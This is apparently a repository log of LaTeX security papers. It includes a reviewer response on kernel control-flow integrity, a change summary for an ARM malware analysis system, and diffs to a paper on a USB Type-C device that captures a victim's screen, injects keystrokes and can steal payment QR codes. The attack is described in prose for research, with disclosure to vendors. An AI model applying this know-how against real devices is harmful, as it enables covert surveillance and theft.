We believe that the overheads introduced by \emph{New-icall} and \emph{New-ret} depend on the
executed times of our instrumented indirect call/jmp and ret instructions.
The results can be found in Table V, pp.12.

%Supposing each
%call instruction is executed once, we can also roughly guess the ratio of incurred overhead between the
%\emph{New-icall} and \emph{New-ret} by the number of indirect call/jmp and
%all call instructions (not ret instructions, as a ret instruction in a function
%\emph{f} could be executed several times by calling the function \emph{f} several
%times at different call cites). For example, in 401.bzip2, there are $302$ indirect call/jmp and
%$4,408$ call instructions, and the actual ratio ($7.46$\%) of overhead between the \emph{New-icall} ($0.51$\%)
%and \emph{New-ret} ($6.84$\%) is roughly equal to $302$/$4,408$ ($6.85$\%).
%The details can be found in Section IV.B, pp12.

%Thank you for such a good suggestion. As mentioned above, we have applied
%our CFI enforcement to several programs (e.g., 401.bzip2) in the SPECCPU
%benchmarks. At the same time, we also achieve the goal to break the results
%down by only with indirect call/jmp or ret instructions to be instrumented, to
%see the impact on the forward/backward edge protection. In order to have an
%intuitive feeling for performance results, We also count the number of
%indirect call and ret instructions respectively. All details can be found
%in Section IV.B,pp11.

\smallskip
\smallskip
\smallskip
\noindent {\bf It would be nice to see a discussion on the impact of
the call/ret stack.}

{\em Authors response:}
Thanks for your suggestion. In the revision, we have raised the discussion
in Section V, pp.13. Specifically, the original call instruction pushes a
return address on the stack and then jumps to the destination, while our scheme
pushes a table index instead and then jumps. On the other hand, in original convention
every function pointer stores a function address, while our scheme replaces the address
with a table index. This instrumentation has changed the semantic of the data.
In some special cases, it might lead to a fault. For example, when a function
pointer is compared with another value by a CMP instruction, instead of only
being consumed by an indirect call/jmp instruction. Although so far we have not
encountered such cases in our prototype, we can recover the original control data
with its index before such usage.

\smallskip
\smallskip
\smallskip
\noindent {\bf Nit Picks:

P2: verifies those information $->$ that

P5: So we put $->$ So, we put

P12: thus it introduces $->$ thus, it introduces }

{\em Authors response:}
Thank you very much for your correction. We have fixed the mistakes in the revision.

\section{Response to Reviewer Three}

\noindent {\bf This paper presents fine-grained control-flow integrity
(\TheName{}) for operating system kernel code. \TheName{} is based on a
static analysis and instrumentation LLVM pass to identify the set of
allowed branch targets for each indirect branch and so-called indexed
hooks to enforce CFI checks at run-time. In addition, it maintains an
interrupt stack to detect attacks that overwrite return addresses
during a context switch. }

{\em Authors response:}
Thank you for the summary.

\smallskip
\smallskip
\smallskip
\noindent {\bf  Memory corruption attacks hijack the program's control
flow to induce malicious program actions. Control-flow integrity (CFI)
mitigates these attacks by enforcing that the program's control flow
follows a legitimate path in the program's pre-defined control-flow graph.
However, existing schemes are either coarse-grained or do not target
kernel code. This paper aims to tackle these limitations by developing
\TheName{}. Given that most work in this area target user-land code, I
appreciate that this paper targets instead the kernel code. However, the
paper does not describe the challenges when applying CFI to kernel code.
One gets the impression that this is mostly an engineering task rather
than developing any new mechanisms. As such, I fear that the paper's main
contribution is rather limited and incremental. }

{\em Authors response:}
Thank you very much for the constructive comments. In the revision, we
have followed your suggestion and presented three additional challenges when
applying CFI in kernels (the details can be found in Section I, pp.2).

The first challenge is due to the asynchronous nature of context switching
and interrupt handling in kernel space. In particular, when an interrupt
occurs, the interrupted program's context information is saved to memory
for later restoring when the program is resumed. Note that the saved
context information could be possibly tampered with by attackers to hijack
the control flow. Different from the control-flow transfer with an
indirect call/jmp or ret instruction, we cannot predetermine when and where
an interrupt may occur, as interrupts could occur at any time or any valid
instruction boundary.

The second challenge comes from the heavy use of single code pointers in
various structures in kernel code, and these pointers may scatter across
the whole kernel. To enforce fine-grained CFI for the
kernel, it requires to identify all these code pointers and leverage them to
infer the point-to set for each indirect function call, which is not an
easy task to implement.

The third challenge is that the performance overhead introduced by the
enforcement should be as low as possible, as the operating system kernel is
the foundation for all the applications.

%It is our negligence for not pointing
%out the challenges when applying CFI to kernel code. The first challenge is to
%complete a sufficiently precise point-to analysis for indirect call/jmp instructions,
%as the kernel makes heavy use of single code pointers in various data structures.
%The second challenge is to achieve the protection for interrupt context in kernel,
%as we cannot predetermine when and where an interrupt may occur. Interrupts
%could occur at any time or any valid instruction boundary in both user and kernel
%space. We have revised it in Section I,pp3 in the revision.

\smallskip
\smallskip
\smallskip
\noindent {\bf In general, the paper is well-written and attempts to
describe the low-level implementation details based on example code.
On the other hand, the main conceptual ideas and innovations are not
really described. }

{\em Authors response:}
Thanks for the comments and criticism. We have revised Section II.B carefully
and made our main conceptual ideas and innovations clearer in the revision.

\emph{First}, we have provided a formal definition of \emph{struct location vector}.
In particular, we define the \emph{struct location vector} of a function pointer
as the location of the function pointer member in a (nested) struct (see Section II.B, pp.4).

\emph{Second}, we have introduced a more high-level description of our pointer
analysis with a basic worklist algorithm that does not require compiler
background knowledge to understand (see Algorithm 1, pp.4).
After that, to describe our algorithm more intuitively, we leverage a simple
example program to present the process to determine the point-to sets of
indirect function calls (see Figure 1 and 2, pp.5).

\emph{Third}, we have described our main innovation clearly in the revision.
Specifically, the main innovation of our retrofitted point-to analysis is that
we introduce a new vector, called \emph{struct location vector}, to infer the
targets for indirect function calls. This is reasonable as we observe that
there are a large number of function pointer initializations and assignments inside
struct variables in kernel space, and the function pointer locates in the
same field of the struct in its lifetime, i.e., from the initialization or assignment to
be consumed by indirect function calls. Combining \emph{struct location vector}
with function signature-based policy, it largely reduces the number of targets
of indirect call/jmp instructions (average 13.14 for each indirect call/jmp
instruction) (see Section II.B, pp.4).

\smallskip
\smallskip
\smallskip
\noindent {\bf The presented approach for points-to analysis seems
reasonable to me and the evaluation demonstrates a significant
reduction of the target branch set. Unfortunately, the paper does not
really compare the target branch set to previous work in this area. }

{\em Authors response:}
Thanks a lot. In the revision, we have provided the comparison of the
reduction of the target branch set to three previous work in this area.
The results show the AIR metric of \TheName{} (99.998\%) is better than
bin-CFI (98.86\%), KCoFI (98.18\%) and Ge's work [1] (99.6\% for return targets and
99.1\% for indirect call/jmp targets).
%Imagine an x86 program with $1$MB code, \TheName{}
%only allows $20$ targets, while bin-CFI, KCoFI and Ge's work still allow $11,400$,
%$18,200$ and $4,000$/$9,000$ targets, respectively. However, recent attacks
%on coarse-grained CFI enforcement show
%that an adversary usually requires only a small part of unintended control flows
%to realize her purpose.
The details can be found in Section IV.A, pp.10.

[1] X. Ge, N. Talele, M. Payer, and T. Jaeger, ``Fine-grained control-flow
integrity for kernel software,'' in Security and Privacy (EuroS\&P), 2016 IEEE
European Symposium on, pp.179-194, IEEE, 2016.

\smallskip
\smallskip
\smallskip
\noindent {\bf The modified interrupt handling to protect return
addresses used in context switches leverages a shadow stack like
approach. I am unsure about the novelty of this approach.
Further, I miss a justification that leveraging a hypervisor to
protect the interrupt handling resembles a reasonable approach. }

{\em Authors response:}
Yes, we do leverage a shadow stack like approach (called interrupt
stack) to protect control data in the interrupt context.
As a usual approach, a number of systems use it to provide protection
for return addresses pushed on the stack by function calls.
However, the difference between shadow stack approach and our protection
mechanism is that interrupts could occur at any time or any valid
instruction boundary, but function calls occur at the fixed
instruction boundaries. In other words, it can be predetermined
when and where an return address will be pushed on the stack
(i.e., when a call instruction is being executed), so that the shadow
stack approach can protect it by instrumenting all the call (and ret)
instructions. However, kernel itself cannot predetermine when and where
an interrupt may occur and it is impossible for us to do that by
instrumenting every instruction in the kernel. As a result, we propose
the hypervisor-based approach to protect control data in the interrupt
context, as the hypervisor can take over the guest VM when an interrupt
happens. So that we can backup the control data in the hypervisor for
later verification when returning from the interrupt handler.

Further, we want to clarify that the main novelty of this paper
is that it leverages a retrofitted context-sensitive and field-sensitive
pointer analysis to obtain the fine-grained CFG of the kernel, which
greatly improves the precision of the result. In particular, we
introduce a new vector, i.e., struct location vector, to infer the targets
for each indirect invocation. It largely reduces the number of targets of
indirect call/jmp instructions (average 13.14 for each indirect call/jmp
instruction).

%Thank you for the comments. Yes, we do leverage a shadow stack like
%approach (called interrupt stack) to protect the interrupt control
%data. However, the biggest difference between shadow stack and our
%protection mechanism is that interrupts could occur at any time or
%any valid instruction boundary, but function calls occur at the fix
%instruction boundaries. In other word, it can be predetermined when
%and where the kernel will push return address to stack (when and
%where a call instruction is about to be executed.) so that shadow
%stack can protect it by instrumenting all call instructions; However,
%kernel ifself cannot predetermine when and where an interrupt will
%happen and it is also impossible to instrument every instructions in
%kernel, thus we propose the hypervisor-based approach to protect
%interrupt context as hypervisor can take over the guest VM when an
%interrupt happens so that we can backup the interrupt context in
%hypervisor for verification when returning from interrupt handler.

\smallskip
\smallskip
\smallskip
\noindent {\bf The evaluation is based on several well-known
benchmark programs and demonstrates the overhead is acceptable.
The security evaluation also includes tests against existing exploit
payloads. \TheName{} is able to prevent the exploits of the RIPE testbed. }

{\em Authors response:}
Thanks for the summary. We have added several new security and performance
evaluation results in the revision (see Section IV, pp.10-13).

\smallskip
\smallskip
\smallskip
\noindent {\bf I miss any comparison to a recent, very closely related
work on kernel-CFI: ``Fine-Grained Control-Flow Integrity for Kernel
Software'' (EURO SP 2016). }

{\em Authors response:}
Thank you very much for the information. We have done a comparison to that
recent work (i.e., ``Fine-Grained Control-Flow Integrity for Kernel
Software'') in the revision (see Section VI, pp.14). In contrast, the biggest
advantage of \TheName{} is that our pointer analysis is based on LLVM IR code
while that work is based on source code. As the IR code of compiler is a
low-level strongly-typed language-independent representation which preserves
most of the type information and enough context information that are required
by our analysis, it is an effective way to determine the target set
of an indirect function call by traversing the function pointer's
transfer process in IR code. As a result, we achieve a higher precision.
For instance, the AIR metric of \TheName{} is 99.998\%, which is better than
that work (99.6\% for return targets and 99.1\% for indirect call/jmp
targets).
%Additionally, we provide a comprehensive protection for control data
%in the interrupt context, while that work does nothing in this aspect which
%obviously exposes to adversary as an available attack surface. Finally, we
We also compare the performance to that work in our revision (see
Section IV.B, pp.12). The results show that the performance overhead
incurred by \TheName{} is smaller than that work.

\end{document}

### 2021-03-12 WOOT/Files/introduction.tex

@@
 extends BadUSB to support the features of \ac{USB} Type-C.  Since \ac{USB} Type-C can transfer video stream data, \tool could obtain the information of the
-victim's graphical interface during attacks.  Combining it with the emulation
+victim's \ac{GUI} during attacks.  Combining it with the emulation
 of traditional \acp{HID}, e.g., keyboards and mice, attackers are capable of
@@
 plugged in for security purposes.  
-Ten volunteers are involved in the user study.
+Ten volunteers participated in the user study.
 Finally, we found that 4,796 of 94,058 records obtained by \tool are related to users' privacy information.
@@
 provides the background of \ac{USB} specification.  Section~\ref{sec:related_work}
-introduces the existing work of \ac{USB} security from the aspects of attacking and
+introduces the existing works of \ac{USB} security from the aspects of attacking and
 defense, respectively.  In Section~\ref{sec:badusb}, we present the threat model

### 2021-03-12 WOOT/Files/related_work.tex

@@
 be transmitted through the \ac{USB} interface. JFA~\cite{JFC}, short for Juice Filming Attacks is an example that abuses this standard and exfiltrates video data
-from the victim without permission. However, in JFC, this data exfiltration is not
+from the victim without permission. However, in JFA, this data exfiltration is not
 combined with BadUSB attacks, and \ac{MHL} is an outdated standard, which limits its
@@
 poweremi,revealing,su2017usb,usbgpslocator,bates2014leveraging,badusbhub,usbfinger,side,usbdriver}
-eavesdrop on leaked signals and recover the sensitive data. In a similar fashion, USBee\cite{usbee} and TURNIPSCHOOL\cite{turnip} emit electromagnetic emissions by data injection on the bus
+eavesdrop on the leaked signals and recover the sensitive data. In a similar fashion, USBee\cite{usbee} and TURNIPSCHOOL\cite{turnip} emit electromagnetic emissions by data injection on the bus
 with the connected \ac{USB} devices as an RF transmitter and USBKiller\cite{usbkiller}
@@
 
-Since \ac{USB} 3.1 was introduced with \ac{USB} Type-C in 2013, display port and HDMI
+Since \ac{USB} 3.1~\cite{usb31} was introduced with \ac{USB} Type-C in 2013, DisplayPort and HDMI
 connectors have been provided by \ac{USB} Type-C, transferring of video data can be
@@
 
-It is worth noting that our \tool is different from JFC~\cite{JFC}.
+It is worth noting that our \tool is different from JFA~\cite{JFC}.
 Juice Filming Attacks cannot control the attacked device, it can only video-capture user inputs during charging.
@@
 on this fact, \ac{USB} Condom~\cite{Condom} is a hardware solution to block data
-channels by adding a blocker in the connector. This blocker can cut off the \mbox{`D-' and `D+'} connection while leaving power pins intact. However, this method poses
+channels by adding a blocker in the connector. This blocker can cut off the \mbox{`D-' and `D+'} connection while leaving the power pins intact. However, this method poses
 a great challenge to the \ac{PnP} property of \ac{USB}, as once it is deployed, it
@@
 whitelist. For example, a naive user may add the \ac{USB} device from unknown
-sources to his/her whitelist without precaution. Fortunately, some designs have proposed to overcome
+sources to his/her whitelist without precaution. Fortunately, some designs have been proposed to overcome
 this drawback. For instance, Mohammadmoradi \emph{et al.}~\cite{mohammadmoradi2018making}\shuqing{check name} propose a strategy to generate such a
@@
 by the device to the user and let the user decide whether to authorize. When a device
-is plugged in, GoodUSB limits its functionality before enumeration until a
+is plugged in, GoodUSB blocks its functionality before enumeration until a
 series of authorizations are completed. These authorizations are designed to be
@@
 detects the novel \ac{USB} packets based on the machine learning algorithm and sends 
-a alert to the user before enumeration. As BadUSB attacks normally request privileged 
+an alert to the user before enumeration. As BadUSB attacks normally request privileged 
 interfaces during enumerating, these defenses are sufficient for these attacks.
 Moreover, Mueller \emph{et al.}~\cite{MuellerZN19} improve the security without changing user experience.
-It can detect the presence of the user, block malicious device in the user's absence until the session is unlocked.
+It can detect the presence of the user, block malicious devices in the user's absence until the session is unlocked.
 
@@
 of the academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exists an attack called JFC~\cite{JFC} which abuses the \ac{MHL}
+exists an attack called JFA~\cite{JFC} which abuses the \ac{MHL}
 standard to steal video stream from the victim. In order to mitigate this
-issue, Meng et al.~\cite{meng2018252} proposed a statistical model using status
-like GPU/CPU usage to detect JFC attacks.
+issue, Meng et al.~\cite{meng2018252} propose a statistical model using status
+like GPU/CPU usage to detect JFA attacks.
 

### 2021-03-12 response_letter/summary_of_changes.tex

\documentclass[journal,12pt,onecolumn,draftclsnofoot,]{IEEEtran}
\newcommand{\TheName}{\textsc{Ninja}}

\usepackage{pifont} 
\usepackage{url}
\def\UrlBreaks{\do\/\do-}

\begin{document}
\title{Summary of Changes}
\maketitle

We would like to express our gratefulness to the reviewers for your 
precious time on reviewing our submission. Here, we present the
motivation of submitting a journal paper based on our USENIX
Security 2017 conference paper and summarize the major updates
and improvements. Then, we provide a list of the detailed changes
in our IEEE TIFS submission.

\section{Changes Between IEEE TIFS Submission and USENIX Security 2017 Paper}

In our USENIX Security 2017 conference paper~\cite{ninja:usenix17}, we proposed
\TheName{}, which is a transparent malware analysis system on ARM platform.
It reduces the footprints and artifacts of an analysis system and provides a
more transparent execution environment for the malware analyst.

However, in the scenario of continuous malware analysis, it is also important
to achieve a fast system restoration. Thus, we design a fast
restoration mechanism which improves the existing restoration
systems~\cite{barebox:acsac11,barecloud:usenix14,malt:sp15,bolt:acsac17}. 
Specifically, we implement selective memory restoration, runtime file system
restoration, and complete context restoration. The selective memory restoration
leverages hardware-based tracing to record the changed memory addresses and
helps to improve the efficiency of memory restoration. The runtime file system
restoration uses existing runtime file system switching technology to efficiently switch
between alternative file systems, while the complete context restoration performs
a complete system register restoration after each analysis session.

Moreover, we extend the trace subsystem of \TheName{} to support data address tracing.
The data address tracing records the related data address of each load/restore
instruction and helps an analyst to learn additional information
about the current running status of a target malware. As an example, 
the analyst may easily infer the plaintext or encryption keys in AES algorithm
with the data addresses~\cite{armageddon:usenix16}. Moreover, the data address 
information is also helpful for dynamic taint analysis~\cite{sokda:sp10} and 
the selective memory restoration discussed above.
In light of this, we add data address tracing to the trace subsystem and implement
it in an NXP i.MX53 Quick Start Board. This implementation
leverages Linux as the rich OS instead of Android (which we implemented in our USENIX Security conference version) and shows the OS-agnostic feature of \TheName{}.

We also
improve the instruction tracing with address range and process ID filters.
These filters help the analyst focus on the interested instructions and processes.
Additionally, we implement more debugging functions related to the CPU 
speculative execution. The PMU-based functionality may provide more granularities 
for stepping. Moreover, some of these granularities are related to the 
speculative execution feature of the CPU which is abused by recent 
Meltdown~\cite{meltdown:lipp} and Spectre~\cite{spectre:kocher} attacks.
With these additional granularities, the analyst can calculate the Meltdown-
and Spectre- related events like cache miss ratio, number of speculatively
executed instructions, and branch mispredict ratio. These statistic data
are proposed to infer Meltdown and Spectre 
attacks~\cite{detection:israel, detection:capsule8}.

\iffalse
Our case study with the Meltdown attack on the ARM 
platform~\cite{meltdownpoc:cosmin} shows that \TheName{} is capable of detecting 
this new attack. 
\fi

Some contents are also removed due to conciseness and the page limit.

\section{Detailed Changes}

\subsection{Abstract}
1) Added a discussion of the newly implemented system restoration mechanism.

\subsection{Introduction}
1) Added a brief introduction of the improved system restoration.

2) Added the performance evaluation result of our system restoration mechanism.

3) Added a detailed description of the new contributions of this journal extension 
as compared with our conference paper.

4) Removed the evaluation result of instruction skid.

\subsection{Background}
1) Removed the background about ARM architecture.

2) Removed Figure 1: The ARMv8 and ARMv7 architectures.

% FIXME: What is Futuremark?
3) Removed the survey of Futuremark about the ARM processors in popular smartphones and tablets.

\subsection{Related Work}
1) Added Section 3.3 to discuss the related works on the system restoration.

3) Revised the related works on transparent malware analysis on x86 in Section 3.1.

2) Removed Section 3.3: TrustZone-related systems.

\subsection{System Architecture}
1) Added data address tracing in Section 4.2 (i.e., using another feature
of the ETM to achieve the data address tracing).

2) Added CPU speculative execution related example (i.e., the 
\texttt{INST\_SPEC} event that fires after an instruction is 
speculatively executed) in Section 4.3.

\subsection{Design and Implementation}
1) Added a new implementation testbed, an NXP i.MX53 Quick Start Board.

2) Added instruction address filter in Section 5.3.1 (i.e., using the
address range comparators in the ETM to restrict the trace to
specific memory ranges).

3) Added process ID filter in Section 5.3.1 (i.e., using the context
ID filters in the ETM to restrict the trace to a specific process).

4) Added Section 5.3.4 to describe the detailed data address tracing.

5) Added $6$ more granularities for
stepping debug including branch instruction,
mispredicted branch instruction, L1 data cache read operation,
L1 data cache refill operation, speculatively executing a
load instruction, and speculatively executing a branch instruction 
in Section 5.4.1.

6) Added Table 1: Representative stepping modes in \TheName{}.

7) Added Section 5.5 to describe the improved system restoration including selective memory restoration, runtime file system restoration, and complete context restoration.

8) Revised Section 5.6 for conciseness.

\subsection{Evaluation}
1) Added Section 7.3.2 to evaluate the performance of the newly implemented
system restoration.

2) Added Table 5: Time consumption of system restoration.

3) Revised the description in Section 7.2.1 and Section 7.2.2 for conciseness.

4) Removed Section 7.1: Output of tracing subsystem and Section 7.5: Skid evaluation.

5) Removed Figure 7: Accessing system instruction interface and Figure 8: Memory
mapped interface.

\subsection{Conclusion}
1) Added a description of the improved system restoration mechanism.

\subsection{Appendix}
1) Removed the appendix section.

\bibliographystyle{IEEEtran}
\bibliography{IEEEabrv,./bibliography/zhenyu}

\end{document}

### 2021-03-12 WOOT/Files/background.tex

@@
 This means every device needs its own driver to work. After \ac{HID}, users only need to
-write one driver for an entire class of \acs{HID}. Furthermore, \ac{HID} standard also
+write one driver for an entire class of \acp{HID}. Furthermore, \ac{HID} standard also
 requires all devices to be \ac{PnP}, which is indeed
@@
 %\noindent\outline{USB3.x}\\
-\ac{USB} 3.0~\cite{usb30} was introduced in 2008, with a super speed (5 Gbit/s) data
+\ac{USB} 3.0~\cite{usb30} was introduced in 2008, with a super speed \mbox{(5 Gbit/s)} data
 transfer rate. Like its predecessor, more classes of peripherals were supported
@@
 %\noindent\outline{Security Problem}\\
-During the development of \ac{USB} specification, security was insufficiently considered~\cite{sok}. But \shuqing{but?}
-the \ac{USB}-IF believes it is the duty of \acp{OEM}
+During the development of \ac{USB} specification, security was insufficiently considered~\cite{sok}. 
+The \ac{USB}-IF believes it is the duty of \acp{OEM}
 to decide whether security features should be implemented~\cite{usbsec}. But the divergent implementations give a chance for attacks like

### 2021-03-12 WOOT/Files/conclusion.tex

@@
 has its own strength and use scenarios. The \ac{HID} Emulation mode largely extends the
-original BadUSB and successfully bypasses existing defenses. The video capture mode proved practical and powerful in the user study, as it extracts
-victim's sensitive information in a stealthy way. The full control mode
-archives the complete hijack of the target device, allowing us to perform various
+original BadUSB. The video capture mode proved practical and powerful in the user study, as it extracts
+victim's sensitive information in a stealthy way. The fully control mode
+achieves the complete hijack of the target device, allowing us to perform various
 types of subsequent attacks. By experimenting \tool with mobile phones, tablets,

### 2021-03-12 WOOT/Files/experiment.tex

@@
 To obtain data close to real-life, they were requested to use phones just as they were normally using sharing power banks.
+At the same time, we used scripts to perform \ac{OCR} recognition for each frame in the videos stream and stored all of the \ac{OCR} results in a database.
+
 After each experiment, the raw video and the corresponding \ac{OCR} result file was generated automatically, then we presented these files to him/her, introduced our attack, told him/her to analyze the video file and replace certain characters of the private data that appear in the \ac{OCR} result file with asterisks.
@@
 
-After collecting the captured videos of the mobile phone, we analyzed the videos automatically.
-During the automatic analysis, we used scripts to perform \ac{OCR} recognition for each frame in the recorded videos and stored all of the \ac{OCR} results in a database.
-In total, there are 94,058 entries of data from 10 volunteers.
+In total, there are 94,058 entries of data from 10 volunteers. An entry is a combination of the case number, the frame number and the desensitized \ac{OCR} result.
 %\shuqing{The data may need to be updated.}

### 2021-03-15 WOOT/Files/discussion.tex
Update
fix problem of mirror, USBc support

@@
 \subsection{Limitation}
-There exist multiple limitations of \tool.
-To begin with, when \tool is attached, the victim's device may not be set to mirror the screen.
+There exist multiple limitations of \tool. To begin with, when \tool is attached, the victim's device may not be set to mirror the screen. 
 Depending on the victim's settings, the \tool may be used as an extended monitor or not be enabled at all.
@@
 Huawei and Smartisan) provide a Desktop Mode to users, which displays a desktop on external screen instead of mirroring.
+Moreover, as mentioned in Section~\ref{sec:experiment}, \tool cannot directly obtain the information on the lock screen.
 In these cases, \tool is either easily noticeable to the victim or disabled.
@@
 In Windows 10, there is a pop-up for user to select the functionality of the external monitor.
-In latter case of a pop-up, \tool can dismiss it by injecting keystrokes and mouse movements.
+In latter case of a pop-up, \tool can dismiss it by injecting keystrokes as described in Section~\ref{subsec:attack_init}.
 But they are still noticeable by the victim.
 Also, it cannot be ignored that DisplayPort over \ac{USB} is not available on all devices.
-When selecting devices to test \tool, we find that many smartphones equipped with USB-C connectors do not support \ac{USB} 3.2 protocol.
-Such lack of support further limits \tool.
+When selecting devices to test \tool, we find that many smartphones equipped with USB-C connectors actually do not support \ac{USB} 3.x protocol.
+There is a incomplete list of devices that support DisplayPort over \ac{USB}~\cite{usbclist} Most vendors like Huawei and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones.
+But there also exists vendor like Xiaomi who does not support \ac{USB} 3.x protocol at all.
+
 \begin{comment}

### 2021-03-15 WOOT/Files/experiment.tex
fix problem of mirror, USBc support

@@
 \subsection{Attack Initialization}
+\label{subsec:attack_init}
 After the \tool is plugged into the victim's device, there is an initialization process to make sure the \tool is able to carry out subsequent attack.
@@
 		During our experiment, we noticed that some devices do not mirror their screen to our \tool by default.
-In this case, \tool will inject a sequence of keystrokes and mouse movements to set the victim's device into mirror their screen.
-For example, in Windows 10, \tool can inject `Win+P' keystroke and a mouse click on the `Duplicate' option.
-However, as \tool is unable to obtain the screen during this process, this can only be performed blindly with a possibility of failure.
+In this case, \tool will inject a sequence of keystrokes to set the victim's device into mirror their screen.
+In both Windows 10 and Ubuntu (Gnome Desktop), \tool can inject `Win+P' multiple times to switch between different modes for external display.
+In MacOS, according to the official manual~\cite{appleman}, \tool can inject \mbox{`Command+F1'} keystroke to  set the monitor into mirroring the primary screen.
+However, if the victim has default  setting for external monitor display mode, \tool will have to try these keystroke repeatedly to set itself into mirroring the victim's screen.
+For example, in Ubuntu, if the default setting is to disable external screen, \tool needs to press `Win+P' four times while if the default setting is to extend the primary screen, \tool needs to press `Win+P' five times.
 	\item \textbf{Dismiss Notification}:
@@
 In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
-2020}, a PC in Windows 10 \mbox{(OS Build 18363.1379)} with two \ac{USB} Type-C interfaces as the
+2020}, a PC in Windows 10 \mbox{(OS Build 18363.1379)} and Ubuntu 20.04.2 LTS with two \ac{USB} Type-C interfaces as the
 target device.

### 2021-03-17 WOOT/Files/related_work.tex
comparision JFA

@@
 be transmitted through the \ac{USB} interface. JFA~\cite{JFC}, short for Juice Filming Attacks is an example that abuses this standard and exfiltrates video data
-from the victim without permission. However, in JFA, this data exfiltration is not
-combined with BadUSB attacks, and \ac{MHL} is an outdated standard, which limits its
-capability.
+from the victim without permission. 
+There are two main differences between \tool and JFA: \ding{182} According to the official list of \ac{MHL} Devices~\cite{MHLlist}, the latest device supporting \ac{MHL} is released in 2015, which limits the capabilities of JFA.
+However, \tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.
+So \tool has a wider attack range.
+\ding{183} JFA can only exfiltrate video data under the victim's control of his/her device, while \tool can control the victim's device at the same time as monitoring the screen.
+For example, when the victim forgets to lock the screen of his/her device, JFA can only captrue the static screen of the victim's device.
+However \tool can open the payment application by mouse, exfiltrates the payment QR code, and steal money by scanning the payment QR code.
 
@@
 corruption, and code injection. This has paved the path for our \tool.
-
-It is worth noting that our \tool is different from JFA~\cite{JFC}.
-Juice Filming Attacks cannot control the attacked device, it can only video-capture user inputs during charging.
-However, our \tool can control the attacked device at the same time as monitoring the screen, which enhances the efficiency of stealing users' private data.
 

### 2021-03-17 WOOT/Files/related_work.tex
JFA

--- 2021-03-12 WOOT/Files/related_work.tex
@@
 attacks~\cite{badusb} are unable to obtain video feedback from the victim
-as video stream was not supported until \ac{USB} 3.0~\cite{usb30}. Although \ac{USB} 2.0 does not
-support video transmission, there exists a protocol called \ac{MHL} which extends the \ac{USB} standard and allows the video signal to
-be transmitted through the \ac{USB} interface. JFA~\cite{JFC}, short for Juice Filming Attacks is an example that abuses this standard and exfiltrates video data
-from the victim without permission. However, in JFA, this data exfiltration is not
-combined with BadUSB attacks, and \ac{MHL} is an outdated standard, which limits its
-capability.
+as video stream was not supported until \ac{USB} 3.0~\cite{usb30}.
+
+\ac{MHL} extends the \ac{USB} standard and allows the video signal to
+be transmitted through the \ac{USB} interface even for \ac{USB} 2.0 protocol. 
+JFA~\cite{JFC}, short for Juice Filming Attacks,
+abuses this standard and monitoring victim's device utilizing \ac{USB} 2.0 protocol. Although JFA~\cite{JFC} could  exfiltrates video data from the victim without permission,  
+there are two main limitation compared with \tool: 
+\ding{183} JFA~\cite{JFC} can only exfiltrate video data under from victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
+For example, when the victim forgets to lock the screen of his/her device, JFA can only captrue the static screen of the victim's device.
+However \tool can open the payment application by mouse, exfiltrate the payment QR code, and steal money by scanning the payment QR code.
+\ding{182} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest devices supporting \ac{MHL} are released in 2015, a lack of support of \ac{MHL} limits the capabilities of JFA.
+\tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.
+So \tool has a wider attack range.
 

### 2021-03-17 WOOT/Files/related_work.tex
JFA

@@
 JFA~\cite{JFC}, short for Juice Filming Attacks,
-abuses this standard and monitoring victim's device utilizing \ac{USB} 2.0 protocol. Although JFA~\cite{JFC} could  exfiltrates video data from the victim without permission,  
+abuses this standard and monitoring victim's device utilizing \ac{USB} 2.0 protocol. Although JFA~\cite{JFC} could exfiltrates video data from the victim's device without permission,  
 there are two main limitation compared with \tool: 
-\ding{183} JFA~\cite{JFC} can only exfiltrate video data under from victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
-For example, when the victim forgets to lock the screen of his/her device, JFA can only captrue the static screen of the victim's device.
-However \tool can open the payment application by mouse, exfiltrate the payment QR code, and steal money by scanning the payment QR code.
-\ding{182} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest devices supporting \ac{MHL} are released in 2015, a lack of support of \ac{MHL} limits the capabilities of JFA.
+\ding{182} JFA~\cite{JFC} can only exfiltrate video data from the victim's device, while \tool can control the victim's device at the same time as monitoring the screen.
+For example, when a victim forgets to lock the screen of his/her device, JFA can only captrue the static screen of the victim's device.
+However \tool can open the payment application in the victim's device by mouse, exfiltrate the payment QR code, and steal money by scanning the payment QR code.
+\ding{183} The official list of \ac{MHL} Devices~\cite{MHLlist} shows that the latest devices supporting \ac{MHL} are released in 2015, a lack of support of \ac{MHL} limits the capabilities of JFA.
 \tool attacks over \ac{USB} Type-C interface, the latest \ac{USB} connector designed to replace all previous USB connector including MicroUSB~\cite{li2018usb}.

### 2021-03-17 WOOT/Files/conclusion.tex
responsiable disclosure

@@
 \section{Responsible Disclosure}
-
-Responsible disclosure have already been carried out, we have already contacted Huawei and Apple through proper channel and are waiting for mitigation being deployed.
-We revived response from Huawei on \nth{7} March and discussed about the mitigation plan on \nth{10} March while Apple has not responded yet.
+Responsible disclosure have already been carried out, we have already contacted HUAWEI and Apple through proper channel.
+We received response from HUAWEI on \nth{7} March and discussed about the mitigation plan on \nth{10} March while Apple has not responded yet.
+HUAWEI security team has confirmed this issue and been weighing different mitigation approaches.
+We are actively facilitating their mitigating process and waiting for mitigation to be deployed.

### 2021-03-17 WOOT/Files/experiment.tex
responsiable disclosure

@@
 
-\circled[text=white,fill=myblue]{\scriptsize{A}} is a Huawei mobile phone, the victim's device; \circled[text=white,fill=myblue]{\scriptsize{B}} is a compact look of \tool prototype; \circled[text=white,fill=myblue]{\scriptsize{1}} is the \ac{USB} 3.x Hub; \circled[text=white,fill=myblue]{\scriptsize{2}} is a Raspberry Pi 4B as the Single Board Computer; \circled[text=white,fill=myblue]{\scriptsize{3}} is an auxiliary power bank; \circled[text=white,fill=myblue]{\scriptsize{4}} is the Video Capture Card; \circled[text=white,fill=myblue]{\scriptsize{5}} is an Atmel ATMEGA32U4 board as the \ac{HID} Emulator.
